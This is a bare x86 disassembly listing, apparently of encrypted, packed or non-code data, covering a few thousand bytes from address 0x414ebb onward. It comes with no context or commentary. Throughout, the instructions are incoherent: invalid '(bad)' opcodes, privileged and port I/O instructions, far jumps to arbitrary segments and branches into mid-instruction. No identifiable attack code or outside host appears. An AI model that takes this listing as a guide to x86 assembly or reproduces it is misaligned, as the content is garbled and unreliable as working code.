  414ebb:	push   0x3b
  414ebd:	js     0x414ed4
  414ebf:	mov    ebx,0x50f7098c
  414ec4:	out    0xc0,eax
  414ec6:	cdq    
  414ec7:	mov    al,0xdc
  414ec9:	pop    eax
  414eca:	jbe    0x414e4e
  414ecc:	jle    0x414ee2
  414ece:	mov    bh,0xb
  414ed1:	xchg   edi,eax
  414ed2:	mov    ch,BYTE PTR [ebx+0x2]
  414ed5:	add    esp,DWORD PTR [edx]
  414ed7:	mov    WORD PTR [eax+0x5010cb6],cs
  414edd:	or     DWORD PTR [esi-0x3a],ebx
  414ee0:	pop    edi
  414ee1:	xor    DWORD PTR [edx],edi
  414ee3:	jb     0x414ec3
  414ee5:	(bad)  
  414ee6:	int3   
  414ee7:	pop    edx
  414ee8:	sbb    BYTE PTR [ecx-0x65],bh
  414eeb:	pop    eax
  414eec:	xchg   ebx,eax
  414eed:	jo     0x414f14
  414eef:	cmp    bh,al
  414ef1:	cmp    eax,ecx
  414ef3:	iret   
  414ef4:	sahf   
  414ef5:	xchg   edx,eax
  414ef6:	mov    eax,ds:0xc8f6ac1e
  414efb:	pop    ss
  414efc:	je     0x414f64
  414efe:	lea    esp,[ebx+0x22]
  414f01:	gs dec esp
  414f03:	xchg   BYTE PTR [esi-0x361c91c9],al
  414f09:	sbb    al,BYTE PTR [esi-0x5]
  414f0c:	mov    ecx,DWORD PTR [ebp+0x5861ddea]
  414f12:	or     edi,DWORD PTR [esi]
  414f14:	shl    BYTE PTR [eax-0x3dca1ae7],0xe2
  414f1b:	xchg   esp,eax
  414f1c:	dec    ebx
  414f1d:	xchg   edx,eax
  414f1e:	icebp  
  414f1f:	fldenv [esi+0x52]
  414f22:	adc    edi,DWORD PTR [esi-0x73c20f67]
  414f28:	xor    eax,0x896b0efe
  414f2d:	xor    al,0xef
  414f2f:	add    eax,0xc29a5b38
  414f34:	les    ebx,FWORD PTR [edx+edx*1-0x731c79d1]
  414f3b:	xchg   edi,eax
  414f3c:	inc    edi
  414f3d:	xchg   DWORD PTR ds:0xa70e3558,ebx
  414f43:	gs xchg ebp,eax
  414f45:	xlat   BYTE PTR ds:[ebx]
  414f46:	cmc    
  414f47:	mov    ebp,0xfb79695b
  414f4c:	mov    edx,DWORD PTR [edx]
  414f4e:	shr    DWORD PTR [ecx+0x40],cl
  414f51:	mov    bh,0x6b
  414f53:	jb     0x414f76
  414f55:	ss sbb eax,0xd122629e
  414f5b:	lea    edx,[edi+esi*1-0x23a8f3d6]
  414f62:	push   es
  414f63:	mov    ecx,0xe232c3c1
  414f68:	stos   BYTE PTR es:[edi],al
  414f69:	sub    cl,bh
  414f6b:	push   0x9a18b606
  414f70:	lea    eax,[esi+ebp*4]
  414f73:	into   
  414f74:	jns    0x414f35
  414f76:	cld    
  414f77:	adc    esp,edi
  414f79:	inc    BYTE PTR [ecx]
  414f7b:	loope  0x414f24
  414f7d:	push   ecx
  414f7e:	cld    
  414f7f:	in     eax,0x6e
  414f81:	leave  
  414f82:	or     al,0xa6
  414f84:	lods   eax,DWORD PTR ds:[si]
  414f86:	pop    es
  414f87:	dec    eax
  414f88:	cwde   
  414f89:	sub    BYTE PTR [edx],0x4
  414f8c:	lahf   
  414f8d:	inc    ecx
  414f8e:	rol    BYTE PTR es:[ebp+0x28567347],1
  414f95:	xlat   BYTE PTR ds:[ebx]
  414f96:	add    al,0x9d
  414f98:	jl     0x415002
  414f9a:	rcr    dl,1
  414f9c:	adc    BYTE PTR [edx-0x349ad8aa],ah
  414fa2:	sub    DWORD PTR [edi],esi
  414fa4:	mov    esi,0x699ba533
  414fa9:	sbb    bl,BYTE PTR [edi+0x36]
  414fac:	jae    0x414fb4
  414fae:	xchg   BYTE PTR [edx-0x80],dl
  414fb1:	xor    bl,BYTE PTR [edx-0x6d778920]
  414fb7:	jmp    0xadf30042
  414fbc:	inc    eax
  414fbd:	xlat   BYTE PTR ds:[ebx]
  414fbe:	push   eax
  414fbf:	fidivr DWORD PTR [edi+0x55]
  414fc2:	jl     0x414f81
  414fc4:	pop    eax
  414fc5:	cld    
  414fc6:	je     0x414f5f
  414fc8:	loopne 0x414f72
  414fca:	inc    esp
  414fcb:	inc    edx
  414fcc:	push   ss
  414fcd:	popf   
  414fce:	test   DWORD PTR [ebx],ecx
  414fd0:	dec    edi
  414fd1:	jb     0x414fb5
  414fd3:	test   al,0x90
  414fd5:	icebp  
  414fd6:	inc    ecx
  414fd7:	imul   edi,DWORD PTR [ebp+ecx*1+0x1a],0x406ba65f
  414fdf:	addr16 push cs
  414fe1:	je     0x414fd2
  414fe3:	lods   al,BYTE PTR ds:[esi]
  414fe4:	clc    
  414fe5:	fimul  WORD PTR [eax]
  414fe7:	outs   dx,DWORD PTR ds:[esi]
  414fe8:	cmp    cl,dl
  414fea:	cmp    edi,DWORD PTR [esi+0x165732f8]
  414ff0:	pop    esp
  414ff1:	pushf  
  414ff2:	aad    0x10
  414ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff5:	xor    esi,DWORD PTR [edi]
  414ff7:	out    dx,al
  414ff8:	clc    
  414ff9:	and    bh,bl
  414ffb:	jmp    0x414fbb
  414ffd:	imul   ebx,DWORD PTR [eax-0x5],0x4c862243
  415004:	lock dec esi
  415006:	repnz push ebp
  415008:	test   al,0xf
  41500a:	stos   BYTE PTR es:[edi],al
  41500b:	and    DWORD PTR [ecx],eax
  41500d:	sub    BYTE PTR [eax+0xf],dl
  415010:	aas    
  415011:	test   DWORD PTR [edi],edi
  415013:	push   0x1a
  415015:	popf   
  415016:	push   bp
  415018:	scas   eax,DWORD PTR es:[edi]
  415019:	jl     0x414fce
  41501b:	daa    
  41501c:	or     BYTE PTR [esi+0x6c],bl
  41501f:	daa    
  415020:	or     BYTE PTR [ecx-0x2a9de840],bh
  415026:	in     al,dx
  415027:	lock int3 
  415029:	dec    edx
  41502a:	es jb  0x41506d
  41502d:	dec    ecx
  41502e:	cli    
  41502f:	cld    
  415030:	add    al,0xbc
  415032:	dec    ebx
  415033:	xchg   edx,ecx
  415035:	js     0x415013
  415037:	xchg   edi,eax
  415038:	jb     0x415017
  41503a:	pop    ss
  41503b:	mov    WORD PTR [esi+0x58],?
  41503e:	(bad)  [edi+0x4d]
  415041:	inc    ebx
  415042:	sti    
  415043:	out    0x59,eax
  415045:	jmp    0x415080
  415047:	mov    cl,0x74
  415049:	xor    DWORD PTR [edx-0x6c],esp
  41504c:	popf   
  41504d:	xsha256 (bad)
  41504e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41504f:	xchg   ebp,eax
  415050:	(bad)  
  415052:	cwde   
  415053:	jo     0x4150ad
  415055:	pop    ebp
  415056:	fild   DWORD PTR [eax+0x10e2bbae]
  41505c:	loope  0x415034
  41505e:	xlat   BYTE PTR ds:[ebx]
  41505f:	sar    BYTE PTR [edx],0x3f
  415062:	sub    BYTE PTR [edx+edx*4+0xb],al
  415066:	cs addr16 pusha 
  415069:	mov    ebx,0x99655d3a
  41506e:	dec    edx
  41506f:	sub    al,0x95
  415071:	fnsave ds:0xf7a317ec
  415077:	ficomp WORD PTR [eax]
  415079:	sbb    eax,0xf0e52776
  41507e:	ds jecxz 0x415100
  415081:	js     0x4150e1
  415083:	adc    bh,dl
  415085:	fsub   DWORD PTR [edi-0x7dd4ab06]
  41508b:	jbe    0x41501f
  41508d:	jmp    0x6b036604
  415092:	jns    0x4150b2
  415094:	pusha  
  415095:	lods   eax,DWORD PTR ds:[esi]
  415096:	add    ch,BYTE PTR [eax+eax*4]
  415099:	push   ds
  41509a:	into   
  41509b:	aam    0x34
  41509d:	ret    0x957b
  4150a0:	or     ch,dl
  4150a2:	clc    
  4150a3:	add    DWORD PTR [esi],0xffffffe1
  4150a6:	cmc    
  4150a7:	js     0x41502a
  4150a9:	rol    DWORD PTR [ebp-0x5761a0ab],cl
  4150af:	cmc    
  4150b0:	iret   
  4150b1:	mov    eax,0x94038911
  4150b6:	jle    0x415054
  4150b8:	xchg   BYTE PTR [edx-0x67],dh
  4150bb:	(bad)  
  4150bc:	sub    BYTE PTR [ecx+0xa],dh
  4150bf:	adc    DWORD PTR [esi+ebp*1+0x4f],ecx
  4150c3:	push   edx
  4150c4:	sub    ebx,edi
  4150c6:	cwde   
  4150c7:	mov    ah,0x3a
  4150c9:	jno    0x41507a
  4150cb:	sbb    BYTE PTR [eax+0x1b367446],bl
  4150d1:	ja     0x41511f
  4150d3:	and    al,0x42
  4150d5:	outs   dx,DWORD PTR ds:[esi]
  4150d6:	mov    eax,0xc2e4bf3e
  4150db:	pop    edx
  4150dc:	cs dec eax
  4150de:	sbb    eax,0xa0f74f54
  4150e3:	jno    0x415144
  4150e5:	mov    dl,0xc2
  4150e7:	pop    es
  4150e8:	add    eax,0x5f680d8b
  4150ed:	or     ebx,edi
  4150ef:	push   eax
  4150f0:	jbe    0x41509d
  4150f2:	xor    eax,0x3740d4e7
  4150f7:	inc    eax
  4150f8:	adc    ebp,esi
  4150fa:	pushf  
  4150fb:	jo     0x415162
  4150fd:	icebp  
  4150fe:	pop    esp
  4150ff:	push   esi
  415100:	or     ecx,DWORD PTR ds:0xf5412475
  415106:	pop    ss
  415107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415108:	int3   
  415109:	into   
  41510a:	int    0x61
  41510c:	pop    edi
  41510d:	push   0x22
  41510f:	sub    ah,bh
  415111:	stc    
  415112:	xchg   DWORD PTR [eax],edi
  415114:	inc    edx
  415115:	call   0x5579b5d2
  41511a:	xchg   edx,eax
  41511b:	mov    eax,0x858fa870
  415120:	jo     0x41516d
  415122:	daa    
  415123:	repz scas eax,DWORD PTR es:[edi]
  415125:	in     eax,0xed
  415127:	mov    ebp,0x8758a7b7
  41512c:	aas    
  41512d:	retf   
  41512e:	outs   dx,BYTE PTR ds:[esi]
  41512f:	inc    edx
  415130:	std    
  415131:	pusha  
  415132:	std    
  415133:	int3   
  415134:	dec    edx
  415135:	sbb    DWORD PTR [ebp-0x2ed34c23],0xe0d1a98e
  41513f:	push   es
  415140:	ja     0x415113
  415142:	or     al,0x36
  415144:	push   cs
  415145:	mov    edx,0x63447dbe
  41514a:	ret    0x3fa0
  41514d:	int    0x1d
  41514f:	fwait
  415150:	mov    ah,0x2f
  415153:	shl    bl,cl
  415155:	call   0xd3138c7d
  41515a:	sub    al,bh
  41515c:	or     esp,edi
  41515e:	or     eax,0xe366aeaf
  415163:	jge    0x4151a9
  415165:	mov    al,0x29
  415167:	inc    edi
  415168:	(bad)  
  415169:	adc    ch,BYTE PTR [esi+0x4ae9a706]
  41516f:	mov    dh,0xf1
  415171:	sub    ecx,esp
  415173:	neg    DWORD PTR [ecx]
  415175:	jae    0x41512b
  415177:	mov    bl,0x6a
  415179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41517a:	lea    edx,[edx]
  41517c:	les    edi,FWORD PTR [edi+0x18]
  41517f:	xchg   edi,eax
  415180:	push   esp
  415181:	mov    dh,BYTE PTR [ebx+0x4c]
  415184:	das    
  415185:	xchg   edi,eax
  415186:	push   ss
  415187:	xor    al,0x93
  415189:	retf   
  41518a:	(bad)  
  41518b:	jno    0x4151b3
  41518d:	xchg   DWORD PTR [ebx],esi
  41518f:	sub    edi,DWORD PTR [ebx-0x5c4b70eb]
  415195:	ret    
  415196:	jmp    0xbf4e:0xac401453
  41519d:	and    bl,BYTE PTR [esi+0x4b]
  4151a0:	push   ebx
  4151a1:	pop    esp
  4151a2:	push   esp
  4151a3:	dec    eax
  4151a4:	sahf   
  4151a5:	sub    ecx,DWORD PTR [edi+0x6062849]
  4151ab:	cmp    DWORD PTR [eax+0x21],eax
  4151ae:	or     BYTE PTR [ecx],cl
  4151b0:	test   al,0x2a
  4151b2:	and    BYTE PTR [eax+0xf52c483],ah
  4151b8:	xor    bh,bl
  4151ba:	cmp    ch,BYTE PTR [ecx+0x5b2c4b50]
  4151c0:	inc    esp
  4151c1:	nop
  4151c2:	mov    DWORD PTR [ebx-0x78],esi
  4151c5:	enter  0x501,0x30
  4151c9:	pushf  
  4151ca:	and    cl,BYTE PTR [edx]
  4151cc:	iret   
  4151cd:	popw   ss
  4151cf:	adc    eax,0xfe3dd059
  4151d4:	mov    DWORD PTR [eax-0x4f],eax
  4151d7:	fcom   QWORD PTR [ebx+eiz*8+0x408755b7]
  4151de:	mov    al,0x4f
  4151e0:	int3   
  4151e1:	stos   DWORD PTR es:[edi],eax
  4151e2:	xor    esi,DWORD PTR [edx]
  4151e4:	adc    dh,dh
  4151e6:	dec    edi
  4151e7:	ja     0x415215
  4151e9:	mov    edi,0xa61949e1
  4151ee:	add    BYTE PTR [ecx],cl
  4151f0:	shl    DWORD PTR [ebp-0x9],0x12
  4151f4:	mov    esi,0x478ee7a5
  4151f9:	mov    dh,0xa
  4151fb:	dec    edi
  4151fc:	test   DWORD PTR [edx],0xed46e192
  415202:	cmp    edx,DWORD PTR [ebx+0x56aee716]
  415208:	adc    BYTE PTR ds:0x72155b8a,dl
  41520e:	popa   
  41520f:	pushf  
  415210:	jae    0x415264
  415212:	adc    ch,BYTE PTR [edi+ecx*4+0x3997b24f]
  415219:	test   ecx,esp
  41521b:	add    DWORD PTR [eax],esi
  41521d:	int3   
  41521e:	inc    eax
  41521f:	mul    BYTE PTR [edi+0x34db81c]
  415225:	(bad)  
  415226:	lahf   
  415227:	xor    BYTE PTR [edx+0x23a42c25],al
  41522d:	xchg   edi,eax
  41522e:	pop    ds
  41522f:	mov    al,BYTE PTR [edx]
  415231:	mov    dh,0x2c
  415233:	ret    0xbfe4
  415236:	imul   ecx,DWORD PTR [esi],0x26
  415239:	jnp    0x4151f7
  41523b:	call   0x4db2:0x5d3bcf87
  415242:	inc    edx
  415243:	arpl   WORD PTR [edi],di
  415245:	test   DWORD PTR [ebx],edx
  415247:	pop    ecx
  415248:	pusha  
  415249:	std    
  41524a:	cmovg  edx,DWORD PTR [esi-0x5a]
  41524e:	xor    BYTE PTR [edi+0x45],cl
  415251:	inc    edi
  415252:	pop    eax
  415253:	aas    
  415254:	imul   eax,eax,0x7f6ffa58
  41525a:	leave  
  41525b:	sub    bh,BYTE PTR [eax]
  41525d:	jg     0x4152a3
  41525f:	fiadd  DWORD PTR [ecx-0x4845ad17]
  415265:	fisttp QWORD PTR [esi-0x47]
  415268:	test   BYTE PTR [ecx+0x11],0x10
  41526c:	cld    
  41526d:	inc    edx
  41526e:	call   0x2768:0x933dc2d
  415275:	pop    edx
  415276:	outs   dx,BYTE PTR ds:[esi]
  415277:	out    0x6a,eax
  415279:	mov    esi,0x9961fab4
  41527e:	and    al,0xd8
  415280:	push   esi
  415281:	add    BYTE PTR [esp+ebx*8],al
  415284:	or     eax,0xf457966
  415289:	popa   
  41528a:	ins    BYTE PTR es:[edi],dx
  41528b:	loop   0x4152af
  41528d:	in     al,dx
  41528e:	imul   edx,edx,0xe80a4c0f
  415294:	int3   
  415295:	das    
  415296:	rep ins BYTE PTR es:[edi],dx
  415298:	daa    
  415299:	cmp    eax,0xbf9c5e3b
  41529e:	dec    edx
  41529f:	dec    ebx
  4152a0:	ss loopne 0x4152fe
  4152a3:	add    eax,0xcb8929d9
  4152a8:	outs   dx,DWORD PTR ds:[esi]
  4152a9:	mov    ss,WORD PTR [ecx+esi*4]
  4152ac:	fist   DWORD PTR [eax-0x7635cea8]
  4152b2:	mov    edx,0x3f3bdeb4
  4152b7:	les    esp,FWORD PTR [esi]
  4152b9:	mov    al,0xff
  4152bb:	sti    
  4152bc:	and    al,BYTE PTR [ebp-0x24]
  4152bf:	or     BYTE PTR [edx-0x2b],ch
  4152c2:	mov    ah,0x5b
  4152c4:	test   al,0xa
  4152c6:	cmp    eax,0x3f367960
  4152cb:	aad    0xe9
  4152cd:	cmp    esi,edx
  4152cf:	mov    ds:0x8893aa26,al
  4152d4:	test   DWORD PTR [edx-0x31b7d2],0xb2d23417
  4152de:	jnp    0x4152e0
  4152e0:	rep stos BYTE PTR es:[edi],al
  4152e2:	sbb    ebp,DWORD PTR [edx-0x526a732d]
  4152e8:	mov    eax,0xa957b2d6
  4152ed:	and    eax,DWORD PTR [edx-0xe]
  4152f0:	fcmovu st,st(6)
  4152f2:	je     0x415337
  4152f4:	adc    ebx,ebp
  4152f6:	push   edx
  4152f7:	sbb    eax,0x23af7f90
  4152fc:	add    edi,DWORD PTR [esi-0x62a52cba]
  415302:	push   eax
  415303:	inc    ebp
  415304:	push   ds
  415305:	arpl   WORD PTR ds:0x1862d34,bx
  41530b:	pop    eax
  41530c:	fnstcw WORD PTR [eax-0x7146a9b4]
  415312:	pop    esp
  415313:	sub    eax,0xb81d9e4a
  415318:	(bad)  
  415319:	pop    edi
  41531a:	pop    es
  41531b:	sbb    DWORD PTR [ebx+0x44],0x12
  41531f:	gs dec esi
  415321:	ins    BYTE PTR es:[edi],dx
  415322:	(bad)  
  415323:	mov    ah,0xa8
  415325:	dec    edi
  415326:	push   ds
  415327:	leave  
  415328:	inc    edx
  415329:	fldenv [edx-0x3b]
  41532c:	xor    DWORD PTR [eax+edi*4],0xe8008df9
  415333:	outs   dx,DWORD PTR ds:[esi]
  415334:	mov    ds:0xd7ead1f0,al
  415339:	sbb    BYTE PTR [edx-0x76d90a1b],0x45
  415340:	pop    es
  415341:	push   ds
  415342:	or     BYTE PTR [ebp-0x6214149b],bh
  415348:	inc    esi
  415349:	sbb    BYTE PTR [edx-0x26c10ea8],dh
  41534f:	lahf   
  415350:	retf   
  415351:	and    DWORD PTR [edx],esi
  415353:	and    bh,0x7d
  415356:	test   eax,0x5416c35f
  41535b:	imul   eax,DWORD PTR [ecx+0x7d],0xbe8a27ad
  415362:	in     al,0xdf
  415364:	lock les edi,FWORD PTR ds:0xfc50d7e4
  41536b:	gs pop ss
  41536d:	hlt    
  41536e:	or     BYTE PTR [eax-0x23535f18],al
  415374:	jge    0x415357
  415376:	in     eax,0xd9
  415378:	test   BYTE PTR [edx],0x50
  41537b:	jecxz  0x415318
  41537d:	xchg   ebx,eax
  41537e:	mov    al,ds:0xe5b2be9e
  415383:	cwde   
  415384:	pop    es
  415385:	imul   esi,DWORD PTR [ebx],0xfffffff5
  415388:	push   esp
  415389:	jno    0x415312
  41538b:	(bad)  
  41538d:	leave  
  41538e:	mov    ecx,DWORD PTR [edx]
  415390:	gs inc ebx
  415392:	in     al,dx
  415393:	xchg   edx,eax
  415394:	dec    edi
  415395:	in     eax,dx
  415396:	popf   
  415397:	xchg   BYTE PTR [ebx+eax*8],ah
  41539a:	pop    es
  41539b:	cmp    esp,DWORD PTR [edi+0x7f]
  41539e:	and    ch,BYTE PTR ds:0xffd4d1a4
  4153a4:	mov    eax,ds:0x226ed054
  4153a9:	mov    bl,0x26
  4153ab:	scas   al,BYTE PTR es:[edi]
  4153ac:	mov    eax,0x75f5f253
  4153b1:	jno    0x4153bf
  4153b3:	inc    ebp
  4153b4:	fwait
  4153b5:	cmp    DWORD PTR [esi],esp
  4153b7:	in     eax,dx
  4153b8:	aad    0x1f
  4153ba:	sbb    al,0x9a
  4153bc:	jg     0x4153a8
  4153be:	test   DWORD PTR ds:0xbfc5eedb,ebp
  4153c4:	mov    ds:0x4fa227a,al
  4153c9:	xchg   ebx,eax
  4153ca:	hlt    
  4153cb:	imul   ebp,DWORD PTR [edi+0x25],0xffffff8b
  4153cf:	fstp   DWORD PTR [esi]
  4153d1:	or     BYTE PTR [ecx],bl
  4153d3:	dec    eax
  4153d4:	shl    DWORD PTR [eax-0x52],1
  4153d7:	mov    es,WORD PTR [eax+0x7e79d72d]
  4153dd:	jp     0x41541f
  4153df:	data16 adc al,0x84
  4153e2:	push   cs
  4153e3:	test   al,0x3d
  4153e5:	mov    ebp,0x5c352582
  4153ea:	xor    BYTE PTR [ecx-0x6d],0xf4
  4153ee:	inc    esi
  4153ef:	jmp    0x1283:0x95c8f1c5
  4153f6:	push   eax
  4153f7:	ret    
  4153f8:	jns    0x415443
  4153fa:	ret    0x544a
  4153fd:	test   al,0x19
  4153ff:	hlt    
  415400:	lahf   
  415401:	jns    0x415407
  415403:	or     BYTE PTR [ebx+0x49],dl
  415406:	jmp    0xea6e:0x862f6c71
  41540d:	jp     0x3335dfea
  415413:	out    0xa9,al
  415415:	mov    dl,0xab
  415417:	aad    0xbb
  415419:	hlt    
  41541a:	daa    
  41541b:	mov    DWORD PTR [ebx],esp
  41541d:	loopne 0x4153e1
  41541f:	and    cl,BYTE PTR [edx*8-0x71de03d6]
  415426:	xchg   ebp,eax
  415427:	xchg   edx,eax
  415428:	fdivr  DWORD PTR [ecx+0x12]
  41542b:	ret    
  41542c:	es adc ebp,ebx
  41542f:	or     DWORD PTR [ebx-0x598dee03],ebp
  415435:	xor    edx,DWORD PTR [esi-0x67]
  415438:	xor    eax,0x793db831
  41543d:	out    0x14,al
  41543f:	aas    
  415440:	test   BYTE PTR [ecx-0x48],dl
  415443:	xchg   esp,eax
  415444:	les    edi,FWORD PTR [ebx-0x78]
  415447:	dec    edi
  415448:	call   0x79ee511f
  41544d:	in     eax,0x95
  41544f:	mov    eax,ds:0xb3c9adef
  415454:	call   DWORD PTR [ebp+0x6c]
  415457:	dec    ecx
  415458:	mov    ebp,0x241d6bc4
  41545d:	clc    
  41545e:	xor    BYTE PTR [esi-0x65],0xf7
  415462:	cmc    
  415463:	call   0xb0e1d0fe
  415468:	lods   eax,DWORD PTR ds:[esi]
  415469:	rcl    DWORD PTR [ecx-0x516cdc85],cl
  41546f:	shl    edi,cl
  415471:	push   0x58
  415473:	xchg   BYTE PTR [esi],ah
  415475:	or     eax,0xb19b84af
  41547a:	inc    ebp
  41547b:	jmp    0xc11f:0x5e2dbe62
  415482:	and    edi,DWORD PTR [ebp-0x4fce1c14]
  415488:	mov    al,ds:0xf94493a6
  41548d:	cld    
  41548e:	icebp  
  41548f:	lahf   
  415490:	ja     0x4154a9
  415492:	dec    edi
  415493:	and    al,BYTE PTR [esi+esi*4+0x5]
  415497:	mov    esp,0x32656fa9
  41549c:	jb     0x4154f9
  41549e:	outs   dx,BYTE PTR ds:[esi]
  41549f:	mov    ebp,DWORD PTR [eax]
  4154a1:	call   0x2886e940
  4154a6:	sub    edi,DWORD PTR [edi+ebp*4]
  4154a9:	inc    ebx
  4154aa:	jg     0x415475
  4154ac:	cmp    eax,ebx
  4154ae:	into   
  4154af:	jp     0x415516
  4154b1:	pop    ebx
  4154b2:	adc    DWORD PTR [ecx-0x49],edi
  4154b5:	push   edi
  4154b6:	jns    0x41549b
  4154b8:	mov    bl,BYTE PTR [ebx]
  4154ba:	sub    al,0xf5
  4154bc:	loop   0x4154c1
  4154be:	adc    DWORD PTR [edx+0x7a50fdb],ebp
  4154c4:	add    DWORD PTR [ebx],edi
  4154c6:	mov    ds:0x716582dd,al
  4154cb:	das    
  4154cc:	out    0x84,al
  4154ce:	(bad)  
  4154d0:	in     eax,dx
  4154d1:	jmp    0xeb70:0xb03b7aa9
  4154d8:	xor    BYTE PTR [ebx-0x1370d6ee],dh
  4154de:	xchg   edi,eax
  4154df:	fwait
  4154e0:	sub    DWORD PTR [ebx+0x6a],ecx
  4154e3:	add    eax,0xdf6e18b1
  4154e8:	or     ah,bl
  4154ea:	adc    eax,0xc0fb8818
  4154ef:	sbb    al,0xba
  4154f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154f2:	mov    eax,0x23318e9b
  4154f7:	or     al,0x3a
  4154f9:	sub    al,0xb1
  4154fb:	lahf   
  4154fc:	retf   
  4154fd:	es push ecx
  4154ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415500:	xchg   ebp,eax
  415501:	div    DWORD PTR [eax]
  415503:	nop
  415504:	pop    ds
  415505:	scas   eax,DWORD PTR es:[edi]
  415506:	stos   DWORD PTR es:[edi],eax
  415507:	pusha  
  415508:	mov    al,ds:0x79497a00
  41550d:	test   BYTE PTR [edi],0xe7
  415510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415511:	scas   eax,DWORD PTR es:[edi]
  415512:	(bad)
  415516:	rcl    BYTE PTR [edi],1
  415518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415519:	ret    0x1436
  41551c:	mov    BYTE PTR [eax-0x2a2f20a5],ch
  415522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415523:	enter  0xd322,0xbd
  415527:	retf   0x889b
  41552a:	sbb    esp,ebx
  41552c:	imul   BYTE PTR [ebx+0x38]
  41552f:	and    BYTE PTR [ebx+0x26b04106],bl
  415535:	mov    eax,0xb8ba271f
  41553a:	inc    esi
  41553b:	mov    cl,0x98
  41553d:	test   DWORD PTR [esi+edi*1+0x6],ebx
  415541:	retf   
  415542:	(bad)  
  415543:	and    ah,BYTE PTR [edi]
  415545:	xlat   BYTE PTR ds:[ebx]
  415546:	cld    
  415547:	dec    esi
  415548:	adc    eax,0x20116dca
  41554d:	out    0xf,al
  41554f:	(bad)  
  415550:	and    DWORD PTR [edx],esi
  415552:	call   0x7e7b:0x2a9a90ba
  415559:	xchg   edx,eax
  41555a:	jle    0x415552
  41555c:	imul   eax,DWORD PTR fs:[esi+ebx*2-0x6c7e3184],0xb32cc923
  415568:	rcl    cl,cl
  41556a:	sbb    eax,0xb73acb8c
  41556f:	ss cli 
  415571:	pop    es
  415572:	adc    ebp,DWORD PTR [ecx-0xc]
  415575:	lds    eax,FWORD PTR [esi+0x34]
  415578:	cmc    
  415579:	shr    DWORD PTR [esi+edi*1-0x1c],cl
  41557d:	push   ebp
  41557e:	add    ebx,ebp
  415580:	repz jge 0x4155e2
  415583:	adc    al,0x1a
  415585:	adc    DWORD PTR cs:[ebx],edi
  415588:	pop    ebp
  415589:	jge    0x4155cd
  41558b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558c:	and    eax,0xf8fe1ce0
  415591:	push   ss
  415592:	dec    esp
  415593:	pop    esp
  415594:	push   ds
  415595:	xor    dl,BYTE PTR [eax]
  415597:	jno    0x41560d
  415599:	aad    0x7b
  41559b:	mov    edi,0xaca7d2a3
  4155a0:	and    DWORD PTR ss:[edi-0x11],ecx
  4155a4:	inc    edx
  4155a5:	jmp    0xdcceb4fa
  4155aa:	ja     0x415605
  4155ac:	mov    ds:0x4e460a44,eax
  4155b1:	fist   DWORD PTR [edx-0x4300f40a]
  4155b7:	dec    edx
  4155b8:	sub    cl,BYTE PTR [esi+0x49]
  4155bb:	adc    al,0x54
  4155bd:	fnstsw WORD PTR [ebp+0x41db3f52]
  4155c3:	sub    BYTE PTR [edx+0x6c29a1e6],ch
  4155c9:	xchg   BYTE PTR [ebx-0x6a7d5147],bh
  4155cf:	(bad)  
  4155d1:	shl    DWORD PTR [esi+eax*8+0x53],1
  4155d5:	retf   
  4155d6:	ficom  DWORD PTR [eax-0x43e93127]
  4155dc:	jo     0x415640
  4155de:	nop
  4155df:	xor    ebp,DWORD PTR [edi+0x7e5268ed]
  4155e5:	inc    esp
  4155e6:	push   eax
  4155e7:	inc    ebx
  4155e8:	arpl   WORD PTR [edi],bx
  4155ea:	xchg   ebp,eax
  4155eb:	push   ebx
  4155ec:	les    esp,FWORD PTR [eax]
  4155ee:	fs fs or al,0xdd
  4155f2:	addr16 std 
  4155f4:	push   esp
  4155f5:	ror    al,0x5b
  4155f8:	into   
  4155f9:	cld    
  4155fa:	xor    edi,ebp
  4155fc:	aad    0xe2
  4155fe:	std    
  4155ff:	mov    DWORD PTR [edi+0x4d44802],esp
  415605:	mov    eax,ds:0xc34a85
  41560a:	inc    edi
  41560b:	dec    ecx
  41560c:	jg     0x415660
  41560e:	or     edx,DWORD PTR [ebp-0x4649b7f5]
  415614:	shl    BYTE PTR [eax-0x22],cl
  415617:	lods   eax,DWORD PTR ds:[esi]
  415618:	je     0x4155d2
  41561a:	xor    BYTE PTR [edi-0x3ef63ee8],dl
  415620:	jmp    0x415600
  415622:	sti    
  415623:	push   0x50
  415625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415626:	mov    ?,WORD PTR [ebx]
  415628:	hlt    
  415629:	outs   dx,DWORD PTR ds:[esi]
  41562a:	jmp    0x415677
  41562c:	fmul   st(2),st
  41562e:	adc    BYTE PTR [ecx-0x5c],ch
  415631:	dec    ecx
  415632:	rol    DWORD PTR [edx-0x1a],cl
  415635:	mov    bl,0x4d
  415637:	aam    0x27
  415639:	loope  0x415697
  41563b:	es (bad) 
  41563d:	in     al,dx
  41563e:	or     eax,0xdea08409
  415643:	mov    DWORD PTR [ecx-0x233553e3],edx
  415649:	mov    ebx,0x70e62f00
  41564e:	lock inc ecx
  415650:	test   DWORD PTR [ebp-0x63d28074],ecx
  415656:	inc    ebp
  415657:	ds xchg esi,eax
  415659:	sub    eax,0xfe9c32cb
  41565e:	daa    
  41565f:	addr16 push ebx
  415661:	in     eax,dx
  415662:	xchg   BYTE PTR [ebx-0x3],cl
  415665:	outs   dx,DWORD PTR ds:[esi]
  415666:	dec    ebp
  415667:	mov    al,dl
  415669:	and    DWORD PTR [eax],esp
  41566b:	(bad)  
  41566c:	cmp    DWORD PTR [eax+eax*4+0x2ff7127c],edx
  415673:	clc    
  415674:	dec    ebx
  415675:	jns    0x4156f6
  415677:	sbb    ecx,edx
  415679:	cli    
  41567a:	loope  0x415653
  41567c:	push   ss
  41567d:	or     dh,BYTE PTR [edi+0x17c0b451]
  415683:	popf   
  415684:	jmp    FWORD PTR [ebx]
  415686:	retf   0xea0d
  415689:	and    eax,0x6b9887d9
  41568e:	div    BYTE PTR [edi+0x15be0357]
  415694:	jne    0x4156b0
  415696:	pusha  
  415697:	out    0x44,al
  415699:	adc    al,0xbd
  41569b:	push   ecx
  41569c:	rcr    al,cl
